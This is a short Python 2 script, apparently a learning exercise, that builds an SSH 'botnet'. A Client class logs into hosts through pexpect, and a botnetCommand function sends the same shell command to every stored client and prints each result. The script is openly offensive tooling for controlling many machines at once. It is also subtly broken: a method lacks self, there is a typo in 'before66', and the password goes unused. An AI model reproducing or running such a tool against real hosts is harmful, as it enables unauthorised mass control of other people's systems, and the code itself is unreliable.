# -*- coding: utf-8 -*-
from __future__ import unicode_literals
import optparse
from pexpect import pxssh
from pwdDiretory import connect
class Client(object):
	"""docstring for Client"""
	def __init__(self, host,user,password):
		self.host = host
		self.user = user
		self.password = password
		self.session = self.local_connect()
	def local_connect():
		try:
			return connect(self.host, self.user)
		except Exception, e:
			print e
			print '[-] Error Connecting'
	def send_command(self,cmd):
		self.session.sendline(cmd)
		self.session.prompt()
		return self.session.before66

def botnetCommand(command):
	for client in botNet:
		output = client.send_command(command)
		print '[*] output from  ' + client.host
		print '[+] ' + output + '\n'
def addClient(host,user,password):
	client = Client(host, user, password)
	botNet.append(client)
botNet = []


